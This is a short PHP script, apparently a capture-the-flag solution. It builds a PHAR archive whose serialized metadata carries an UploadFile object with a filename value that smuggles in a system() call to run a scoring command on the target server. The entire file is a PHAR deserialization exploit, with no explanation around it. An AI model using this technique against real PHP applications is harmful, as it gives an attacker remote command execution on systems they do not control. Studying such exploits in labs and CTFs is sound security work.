<?php

class UploadFile {
  public $filename="'.system('/usr/local/bin/score 7c928aa8-23b9-4f11-9c17-3b358910c473 > /var/www/score').'";
}

$o=new UploadFile();

$phar = new Phar("phar.phar");
$phar->startBuffering();

$phar->addFromString("test.txt","test");
$phar->setStub("<?php __HALT_COMPILER(); >");

$phar->setMetadata($o);
$phar->stopBuffering();

?>
